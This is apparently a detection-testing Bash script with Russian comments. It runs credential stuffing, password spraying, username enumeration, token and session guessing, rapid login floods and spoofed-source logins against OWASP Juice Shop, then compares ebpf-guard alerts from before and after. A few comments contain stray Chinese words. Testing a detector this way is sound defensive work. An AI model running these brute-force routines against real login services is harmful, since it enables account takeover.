#!/bin/bash
# Brute Force автоматизация для OWASP Juice Shop
# Цель: Тестирование способности ebpf-guard детектировать атаки на аутентификацию

set -e

VPS_IP="${VPS_IP:-localhost}"
JUICE_SH_URL="http://${VPS_IP}:3000"
EBPF_GUARD_API="http://${VPS_IP}:19090"
EBPF_GUARD_TOKEN="${EBPF_GUARD_TOKEN:-$(grep '^admin=' /var/lib/ebpf-guard/token 2>/dev/null | cut -d= -f2)}"  # persisted at /var/lib/ebpf-guard/token
RESULTS_DIR="./bruteforce-results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Anchored to this script's directory, not the working directory — see
# sqlmap-attacks.sh for why (plan.md волна 1.5g).
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MANIFEST_FILE="$SCRIPT_DIR/attack-manifest.json"

# Цвета
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log() { echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1"; }
warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }

# Создание директории для результатов
mkdir -p "$RESULTS_DIR"

# Записывает категорию атаки и её comm в общий attack-manifest.json
# (plan.md волна 1.5g, вопрос 8) — см. sqlmap-attacks.sh для полного
# описания назначения.
record_manifest() {
    local category="$1" comm="$2"
    local manifest="$MANIFEST_FILE"
    local entry
    entry=$(jq -n --arg cat "$category" --arg comm "$comm" --arg ts "$(date -Iseconds)" \
        '{category: $cat, comm: $comm, timestamp: $ts}' 2>/dev/null) || return 0
    if [ -f "$manifest" ]; then
        jq --argjson e "$entry" '. + [$e]' "$manifest" > "$manifest.tmp" 2>/dev/null && mv "$manifest.tmp" "$manifest"
    else
        echo "[$entry]" | jq '.' > "$manifest" 2>/dev/null
    fi
}

# Получение метрик до атаки
get_metrics_before() {
    log "Получение базовых метрик..."
    curl -s -H "Authorization: Bearer $EBPF_GUARD_TOKEN" "$EBPF_GUARD_API/metrics" > "$RESULTS_DIR/metrics-before-$TIMESTAMP.txt"
    curl -s -H "Authorization: Bearer $EBPF_GUARD_TOKEN" "$EBPF_GUARD_API/api/v1/alerts" > "$RESULTS_DIR/alerts-before-$TIMESTAMP.json"
}

# Attack 1: Credential Stuffing с常见 паролями
attack_credential_stuffing() {
    log "==========================================="
    log "ATTACK 1: Credential Stuffing"
    log "==========================================="

    local output_file="$RESULTS_DIR/credential_stuffing_$TIMESTAMP.txt"

    # Список common credential pairs
    local credentials=(
        "admin:admin123"
        "admin:password"
        "admin:123456"
        "admin:admin"
        "admin:root"
        "admin:qwerty"
        "test:test123"
        "test:password"
        "test:123456"
        "jim:jim"
        "bwiki:bwiki"
        "alice:alice"
        "bob:bob"
    )

    log "Пробуем $(echo ${#credentials[@]}) credential combinations..."

    for cred in "${credentials[@]}"; do
        local username=$(echo $cred | cut -d: -f1)
        local password=$(echo $cred | cut -d: -f2)

        curl -s -X POST "$JUICE_SH_URL/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"${username}@juice-sh.op\",\"password\":\"${password}\"}" \
            -o /dev/null -w "Status: %{http_code}\n" \
            >> "$output_file" 2>&1

        # Небольшая задержка между попытками
        sleep 0.1
    done

    log "Credential stuffing завершен. Результаты в $output_file"
    sleep 3
}

# Attack 2: Password Spraying (один пароль на многих пользователей)
attack_password_spraying() {
    log "==========================================="
    log "ATTACK 2: Password Spraying"
    log "==========================================="

    local output_file="$RESULTS_DIR/password_spraying_$TIMESTAMP.txt"
    local common_passwords=("password" "123456" "admin123" "qwerty" "letmein" "welcome")

    local users=(
        "admin" "alice" "bob" "jim" "bwiki" "test" "user"
        "administrator" "root" "support" "service" "api"
    )

    log "Тестирование $(echo ${#common_passwords[@]}) паролей на $(echo ${#users[@]}) пользователей..."

    for password in "${common_passwords[@]}"; do
        log "Тестирование пароля: $password"
        for user in "${users[@]}"; do
            curl -s -X POST "$JUICE_SH_URL/rest/user/login" \
                -H "Content-Type: application/json" \
                -d "{\"email\":\"${user}@juice-sh.op\",\"password\":\"${password}\"}" \
                -o /dev/null -w "Status: %{http_code}\n" \
                >> "$output_file" 2>&1
            sleep 0.05
        done
        echo "" >> "$output_file"
        sleep 1
    done

    log "Password spraying завершен. Результаты в $output_file"
    sleep 3
}

# Attack 3: Sequential Username Enumeration
attack_username_enumeration() {
    log "==========================================="
    log "ATTACK 3: Username Enumeration"
    log "==========================================="

    local output_file="$RESULTS_DIR/enumeration_$TIMESTAMP.txt"

    log "Перебор usernames для выявления существующих..."

    local prefixes=("admin" "user" "test" "api" "service" "bot" "guest" "member")
    local suffixes=("1" "2" "3" "123" "2024" "2025" "_admin" "_user" "")

    for prefix in "${prefixes[@]}"; do
        for suffix in "${suffixes[@]}"; do
            local username="${prefix}${suffix}"

            # Попытка регистрации для проверки существования
            curl -s -X PUT "$JUICE_SH_URL/rest/user/register" \
                -H "Content-Type: application/json" \
                -d "{\"email\":\"${username}@juice-sh.op\",\"password\":\"Test12345!\"}" \
                -o /dev/null -w "Status: %{http_code}\n" \
                >> "$output_file" 2>&1

            sleep 0.05
        done
    done

    log "Username enumeration завершен. Результаты в $output_file"
    sleep 3
}

# Attack 4: API Token Brute Force
attack_api_token_bruteforce() {
    log "==========================================="
    log "ATTACK 4: API Token Brute Force"
    log "==========================================="

    local output_file="$RESULTS_DIR/api_bruteforce_$TIMESTAMP.txt"

    log "Перебор常见 JWT/Bearer токенов..."

    # Попытки с常见 токенами
    local fake_tokens=(
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.admin"
        "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
        "token.admin"
        "api_key_1234567890"
        "sk-12345678901234567890123456789012"
        "test-token-admin"
        "demo-token"
    )

    for endpoint in "/rest/admin/application-version" "/rest/basket/" "/rest/user/whoami"; do
        log "Testing endpoint: $endpoint"
        for token in "${fake_tokens[@]}"; do
            curl -s "$JUICE_SH_URL$endpoint" \
                -H "Authorization: Bearer $token" \
                -o /dev/null -w "Status: %{http_code}\n" \
                >> "$output_file" 2>&1
            sleep 0.05
        done
    done

    log "API token brute force завершен. Результаты в $output_file"
    sleep 3
}

# Attack 5: Session ID Brute Force
attack_session_bruteforce() {
    log "==========================================="
    log "ATTACK 5: Session Fixation/Brute Force"
    log "==========================================="

    local output_file="$RESULTS_DIR/session_bruteforce_$TIMESTAMP.txt"

    log "Перебор session IDs..."

    # Попытки с常见 session patterns
    for i in $(seq 1 100); do
        local session_id="sess_$(printf "%040d" $i)"
        curl -s "$JUICE_SH_URL/rest/user/whoami" \
            -H "Cookie: session=$session_id" \
            -o /dev/null -w "Status: %{http_code}\n" \
            >> "$output_file" 2>&1
        sleep 0.02
    done

    log "Session brute force завершен. Результаты в $output_file"
    sleep 3
}

# Attack 6: High-frequency login attempts (Rate limiting test)
attack_high_frequency() {
    log "==========================================="
    log "ATTACK 6: High-Frequency Login Attempts"
    log "==========================================="

    local output_file="$RESULTS_DIR/high_frequency_$TIMESTAMP.txt"
    local iterations=500

    log "Отправка $iterations быстрых login requests..."

    for i in $(seq 1 $iterations); do
        local random_user="user_$(printf "%04d" $i)"
        curl -s -X POST "$JUICE_SH_URL/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"${random_user}@juice-sh.op\",\"password\":\"wrongpassword\"}" \
            -o /dev/null -w "Status: %{http_code}\n" \
            >> "$output_file" 2>&1

        # Каждые 50 попыток - вывод прогресса
        if [ $((i % 50)) -eq 0 ]; then
            echo " - Progress: $i/$iterations" | tee -a "$output_file"
        fi
    done

    log "High-frequency attacks завершен. Результаты в $output_file"
    sleep 3
}

# Attack 7: Distributed-looking login attempts (from different "sources")
attack_distributed_pattern() {
    log "==========================================="
    log "ATTACK 7: Distributed Pattern Attack"
    log "==========================================="

    local output_file="$RESULTS_DIR/distributed_$TIMESTAMP.txt"

    log "Имитация атак с разными User-Agent и IP patterns..."

    local user_agents=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        "Mozilla/5.0 (X11; Linux x86_64)"
        "curl/7.68.0"
        "Python/3.9 requests"
    )

    for i in $(seq 1 200); do
        local ua="${user_agents[$((i % ${#user_agents[@]}))]}"
        local user="admin$(printf "%02d" $i)"

        curl -s -X POST "$JUICE_SH_URL/rest/user/login" \
            -H "Content-Type: application/json" \
            -H "User-Agent: $ua" \
            -H "X-Forwarded-For: 192.168.1.$((i % 255))" \
            -d "{\"email\":\"${user}@juice-sh.op\",\"password\":\"wrong\"}" \
            -o /dev/null -w "Status: %{http_code}\n" \
            >> "$output_file" 2>&1

        sleep 0.05
    done

    log "Distributed pattern attack завершен. Результаты в $output_file"
    sleep 3
}

# Получение метрик после атаки
get_metrics_after() {
    log "Получение метрик после атаки..."
    curl -s -H "Authorization: Bearer $EBPF_GUARD_TOKEN" "$EBPF_GUARD_API/metrics" > "$RESULTS_DIR/metrics-after-$TIMESTAMP.txt"
    curl -s -H "Authorization: Bearer $EBPF_GUARD_TOKEN" "$EBPF_GUARD_API/api/v1/alerts" > "$RESULTS_DIR/alerts-after-$TIMESTAMP.json"
}

# Анализ результатов
analyze_results() {
    log "==========================================="
    log "АНАЛИЗ РЕЗУЛЬТАТОВ BRUTE FORCE"
    log "==========================================="

    local summary_file="$RESULTS_DIR/summary-$TIMESTAMP.txt"

    {
        echo "BRUTE FORCE ATTACK SUMMARY - $TIMESTAMP"
        echo "========================================"
        echo ""

        # /api/v1/alerts отдаёт JSON-массив на одной строке — "wc -l" всегда
        # давал 1/1/0 независимо от реального числа элементов (см. P2-7 п.4).
        local alerts_before=0 alerts_after=0
        if command -v jq &> /dev/null; then
            alerts_before=$(jq 'length' "$RESULTS_DIR/alerts-before-$TIMESTAMP.json" 2>/dev/null || echo 0)
            alerts_after=$(jq 'length' "$RESULTS_DIR/alerts-after-$TIMESTAMP.json" 2>/dev/null || echo 0)
        fi
        local new_alerts=$((alerts_after - alerts_before))

        echo "Алерты до атаки: $alerts_before"
        echo "Алерты после атаки: $alerts_after"
        echo "Новых алертов: $new_alerts"
        echo ""

        echo "=== METRICS ANALYSIS ==="
        grep -E "auth_attempts_total|brute_force_detected|login_failures" "$RESULTS_DIR/metrics-after-$TIMESTAMP.txt" 2>/dev/null || echo "Auth-related metrics not found"
        echo ""

        echo "=== REQUEST STATISTICS ==="
        local total_requests=0
        local zero_request_files=""
        for file in "$RESULTS_DIR"/*_$TIMESTAMP.txt; do
            if [ -f "$file" ] && [[ ! "$file" =~ (metrics|alerts|summary) ]]; then
                local count=$(grep -c "Status:" "$file" 2>/dev/null)
                echo "$(basename $file): $count requests"
                total_requests=$((total_requests + count))
                if [ "$count" -eq 0 ]; then
                    zero_request_files="$zero_request_files $(basename "$file")"
                fi
            fi
        done

        # Gate: если конкретный сценарий атаки отправил 0 запросов, это баг
        # генератора (см. P2-8), а не "детект не сработал" — явно это отмечаем,
        # чтобы не путать с реальным результатом детектирования.
        echo ""
        echo "=== REQUEST GATE ==="
        echo "Всего запросов по всем сценариям: $total_requests"
        if [ -n "$zero_request_files" ]; then
            echo "GATE: FAILED — сценарии с 0 запросов:$zero_request_files"
        else
            echo "GATE: OK — все сценарии отправили >0 запросов"
        fi

        echo ""
        echo "=== AUTHENTICATION EVENTS IN ebpf-guard ==="
        curl -s -H "Authorization: Bearer $EBPF_GUARD_TOKEN" "$EBPF_GUARD_API/api/v1/alerts" | grep -i "auth\|login\|brute\|password" | head -20 || echo "No auth alerts found"

    } | tee "$summary_file"

    log "Summary сохранен в $summary_file"
}

# Главная функция
main() {
    log "==========================================="
    log "BRUTE FORCE AUTOMATION AGAINST JUICE SHOP"
    log "==========================================="
    log "Juice Shop URL: $JUICE_SH_URL"
    log "ebpf-guard API: $EBPF_GUARD_API"
    log "Results dir: $RESULTS_DIR"
    log "==========================================="
    record_manifest "bruteforce" "curl"

    get_metrics_before

    # Запуск атак
    attack_credential_stuffing
    attack_password_spraying
    attack_username_enumeration
    attack_api_token_bruteforce
    attack_session_bruteforce
    attack_high_frequency
    attack_distributed_pattern

    get_metrics_after
    analyze_results

    log "==========================================="
    log "ВСЕ BRUTE FORCE АТАКИ ЗАВЕРШЕНЫ"
    log "==========================================="
    log "Результаты сохранены в: $RESULTS_DIR"
}

# Запуск
main "$@"
